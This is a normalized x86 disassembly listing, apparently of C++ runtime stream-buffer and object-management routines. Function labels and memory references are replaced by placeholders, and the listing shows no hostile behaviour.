test [ ebp - 0x6c ] 0x4
je r-xdata
mov al [ ebp - 0x65 ]
call sub_448681
retn
push 0x0
push ebx
lea ecx [ ebp - 0x48 ]
call sub_40487c
sub_4030df
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_403111
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_403142
push ebp
mov ebp esp
cmp eax [ ebp + 0xc ]
je r-xdata
pop ebp
retn 0x8
push esi
movzx edx [ eax ]
mov esi [ ebp + 0x8 ]
mov esi [ esi + 0x10 ]
mov dx [ esi + edx * 2 ]
mov [ ecx ] dx
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jne r-xdata
pop esi
sub_403197
push 0x2c
mov eax sub_44b685
call sub_448595
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_44866d
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_424ff8
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_402d9b
push ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_402d21
and [ esi + 0x4 ] 0x0
push esi
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_40322d
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
sub_40322d
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_4474d9
mov edi [ ebp + 0x8 ]
add edi 0x8
mov esi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_403285
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_4473cc
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_4032c8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_447875
mov [ esi ] al
inc esi
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_403346
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_403251
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_40338c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_4252f8
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x10 ] eax
mov [ esi ] r--data
mov eax esi
leave
retn 0x8
sub_4033b7
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4033db
push ebp
mov ebp esp
push esi
push [ eax + 0x4 ]
mov esi ecx
push [ eax ]
mov eax [ ebp + 0x8 ]
call sub_40338c
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4033fb
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push esi
cmp [ ebp + 0x8 ] al
je r-xdata
mov eax [ ecx + 0x10 ]
and eax [ ecx + 0xc ]
xor esi esi
inc esi
test al 0x4
je r-xdata
push eax
test al 0x2
je r-xdata
call sub_4468bc
push eax
push esi
mov eax r--data
call sub_4468bc
push eax
push esi
mov eax r--data
jmp r-xdata
call sub_4468bc
push eax
push esi
mov eax r--data
jmp r-xdata
push eax
call sub_426f77
lea esi [ ebp - 0x14 ]
call sub_40338c
mov [ ebp - 0x14 ] r--data
push r--data
mov eax esi
jmp r-xdata
sub_4034b6
push 0x4
mov eax sub_44a835
call sub_448595
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
call sub_402eaf
mov [ ebp - 0x4 ] esi
mov esi [ ebx + 0x30 ]
mov [ ebp - 0x10 ] 0x1
call sub_402f78
push 0x1
mov ecx ebx
call sub_40355e
mov eax [ ebp + 0x8 ]
call sub_44866d
retn 0x4
sub_403514
push ebx
xor ebx ebx
push 0x4
mov [ edi + 0x30 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] 0x201
mov [ edi + 0x18 ] 0x6
mov [ edi + 0x1c ] ebx
mov [ edi + 0x20 ] ebx
mov [ edi + 0x24 ] ebx
mov [ edi + 0x28 ] ebx
mov [ edi + 0x2c ] ebx
mov [ edi + 0xc ] ebx
call sub_424ff8
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
push esi
mov esi eax
call sub_402f4a
pop esi
jmp r-xdata
mov [ edi + 0x30 ] eax
pop ebx
retn
sub_40355e
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_403583
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_425354
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4035c2
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_425400
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4035ec
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_446d07
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_403685
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi + 0x4 ] 0x0
sub_4036ab
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4036cb
push 0x8
mov eax sub_449e50
call sub_448595
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov edi [ ebp - 0x14 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ ebx + 0x8 ]
lea esi [ eax + 0x4 ]
mov [ eax + 0x8 ] ecx
call sub_403fd4
or [ ebp - 0x4 ] 0xffffffff
test edi edi
je r-xdata
mov eax [ ecx ]
lea edx [ ebp - 0x10 ]
push edx
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x1
mov edi [ eax ]
lea esi [ ebp - 0x14 ]
call sub_403fd4
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
call sub_44866d
retn
mov eax [ edi ]
mov ecx edi
call [ eax + 0x10 ]
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ ebp - 0x10 ] 0x0
sub_403778
push esi
push edi
jmp r-xdata
mov ecx [ edx + 0x4 ]
test ecx ecx
jne r-xdata
lea esi [ ecx + 0x1 ]
lea edi [ edx + 0x4 ]
mov eax ecx
[ edi ] esi
cmp eax ecx
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
pop edi
pop esi
retn
sub_40379c
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov ecx esi
jmp [ eax + 0x8 ]
sub_4037e0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_403893
push ebp
mov ebp esp
mov edx [ eax ]
mov ecx 0x3ffffffe
push esi
cmp edx ecx
je r-xdata
mov [ eax ] ecx
pop esi
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov esi [ esi ]
cmp esi ecx
je r-xdata
lea ecx [ esi + edx ]
sub_4038f9
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
call sub_4252f8
xor eax eax
mov [ esi + 0xc ] r--data
mov [ esi + 0x10 ] eax
or [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x20 ] eax
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
mov eax esi
leave
retn 0x4
sub_403978
push 0x24
mov eax sub_44b660
call sub_448595
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
call sub_44866d
retn
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
lea esi [ ebp - 0x30 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
mov [ eax + 0x1c ] ecx
call sub_405de9
sub_4039da
push 0x24
mov eax sub_44ccd5
call sub_448595
push 0x2
mov eax r--data
lea esi [ ebp - 0x30 ]
call sub_4038f9
and [ ebp - 0x4 ] 0x0
push 0x3e
push r--data
push r--data
push eax
call sub_405e22
sub_403a0c
push ebp
mov ebp esp
push ecx
push esi
lea esi [ ebp - 0x4 ]
call sub_404521
mov eax [ ebp - 0x4 ]
pop esi
test eax eax
je r-xdata
leave
retn
call sub_40619e
sub_403a6f
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi ] 0x0
call sub_4047a1
mov eax esi
pop esi
pop ebp
retn 0x4
sub_403acf
push ebp
mov ebp esp
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax + 0x10 ]
push ebx
push [ ebp + 0x8 ]
add ecx edx
push ecx
lea ebx [ ebp + 0x8 ]
call sub_4047c2
pop ebx
pop ebp
retn 0x4
sub_403b61
push 0x14
mov eax sub_44d97c
call sub_4485c8
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_404c18
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
jne r-xdata
mov dl [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
call sub_404a89
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x18 ] 0x4
jmp sub_403bdb
mov [ ebp - 0x4 ] ebx
jmp sub_403bdb
mov [ ebp - 0x18 ] 0x4
sub_403bdb
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_404c69
mov eax edi
call sub_44866d
retn 0x8
mov eax [ ecx + 0xc ]
or eax [ ebp - 0x18 ]
push ebx
call sub_404912
sub_403c0a
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x34 ]
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
retn
mov eax [ ecx + 0xc ]
push 0x0
or eax edi
call sub_404912
push 0x4
pop edi
sub_403c7d
push 0x4
mov eax sub_44d957
call sub_448595
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
call sub_404a3e
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_40493e
mov [ esi + 0x4 ] al
mov eax esi
call sub_44866d
retn 0x8
sub_403ccd
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_447343
mov ecx edi
call sub_402f60
push edi
call sub_424fc7
pop ecx
sub_403cf6
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
jmp [ eax + 0x18 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_403d16
mov ecx [ esi + 0x20 ]
xor eax eax
cmp [ ecx ] eax
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax ]
mov ecx esi
call sub_404a5c
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov ecx [ esi + 0x20 ]
mov eax [ ecx ]
inc eax
mov [ ecx ] eax
movzx eax [ eax ]
retn
mov ecx esi
jmp sub_403cf6
or eax eax
retn
sub_403d75
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_403d9a
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov edi ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ edi + 0x20 ]
cmp [ ecx ] eax
je r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
cdq
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
mov eax [ edi + 0x30 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x1c ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
inc [ ebp + 0x8 ]
add [ esp + 0x10 ] 0x1
mov [ ecx ] al
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc [ ebp + 0x10 ] 0xffffffff
cmp [ ebp + 0x10 ] ebx
jg r-xdata
test esi esi
je r-xdata
xor eax eax
jl r-xdata
push esi
push [ ecx ]
push [ ebp + 0x8 ]
call sub_4247f0
add [ ebp + 0x8 ] esi
mov eax [ edi + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_403e6f
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov edi ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ edi + 0x24 ]
cmp [ ecx ] eax
je r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
cdq
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
mov eax [ edi + 0x34 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0xc ]
cmp eax 0xffffffff
je r-xdata
jg r-xdata
inc [ ebp + 0x8 ]
add [ esp + 0x10 ] 0x1
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc [ ebp + 0x10 ] 0xffffffff
cmp [ ebp + 0x10 ] ebx
jg r-xdata
test esi esi
je r-xdata
xor eax eax
jl r-xdata
push esi
push [ ebp + 0x8 ]
push [ ecx ]
call sub_4247f0
add [ ebp + 0x8 ] esi
mov eax [ edi + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_403f46
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_403f6c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_403fd4
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov [ esi ] edi
test edi edi
je r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
retn
mov eax [ edi ]
mov ecx edi
jmp [ eax + 0xc ]
and [ esi ] 0x0
sub_404006
push 0x4
mov eax sub_44b63d
call sub_448595
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
call sub_404bdf
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_403ccd
call sub_44866d
retn
sub_404037
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
test edi edi
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp edi edx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
mov [ ecx ] eax
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
jmp r-xdata
pop ebx
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov [ ecx ] al
test eax eax
je r-xdata
push 0x20
pop eax
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
mov ecx 0x7fffffff
sub ecx eax
cmp ecx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_405e71
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
push ebx
push edx
push edi
call sub_4247f0
mov edx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax edi
sub eax edx
add [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
push edx
call sub_424fc7
pop ecx
sub_4041d1
push ebp
mov ebp esp
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] dl
mov eax edx
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
pop ebp
retn 0x4
sub_40421c
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
add ebx esi
cmp esi ebx
jae r-xdata
or eax 0xffffffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ edi ]
jmp r-xdata
or eax 0xffffffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_404279
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x18 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov esi [ eax ]
mov [ ebp - 0x4 ] esi
test esi esi
je r-xdata
mov [ ecx + 0x3c ] eax
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0x2
mov edi [ r--data ]
mov ebx [ r--data ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
xor ecx ecx
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
leave
retn 0x14
mov eax [ r--data ]
mov [ ebp + 0xc ] eax
mov eax [ r--data ]
mov [ ebp + 0x10 ] eax
cmp [ ebp + 0x14 ] 0x2
mov edi [ r--data ]
mov ebx [ r--data ]
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
mov eax [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
test [ ebp + 0x18 ] 0x2
jne r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
cdq
add [ ebp + 0xc ] eax
adc [ ebp + 0x10 ] edx
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
cdq
add [ ebp + 0xc ] eax
adc [ ebp + 0x10 ] edx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov [ ebp + 0xc ] ebx
mov [ ebp + 0x10 ] edi
mov eax esi
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov [ ebp + 0xc ] ebx
mov [ ebp + 0x10 ] edi
mov [ ebp + 0xc ] ebx
mov [ ebp + 0x10 ] edi
jmp r-xdata
jg r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
cdq
cmp [ ebp + 0x10 ] edx
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jb r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
cdq
cmp [ ebp + 0x10 ] edx
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jb r-xdata
jl r-xdata
jl r-xdata
sub esi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add esi [ ebp + 0xc ]
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
add [ eax ] esi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp [ ebp + 0xc ] eax
ja r-xdata
sub esi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add esi [ ebp + 0xc ]
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
add [ ecx ] esi
jmp r-xdata
cmp [ ebp + 0xc ] eax
ja r-xdata
mov edx [ ecx + 0x24 ]
mov edi [ edx ]
test edi edi
je r-xdata
mov eax [ ecx + 0x20 ]
mov esi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ edx ] esi
mov ecx [ ecx + 0x34 ]
sub eax esi
mov [ ecx ] eax
jmp r-xdata
sub_404410
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi [ ecx + 0x24 ]
push edi
mov edi eax
add edi [ ebp + 0xc ]
mov eax [ esi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp edi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
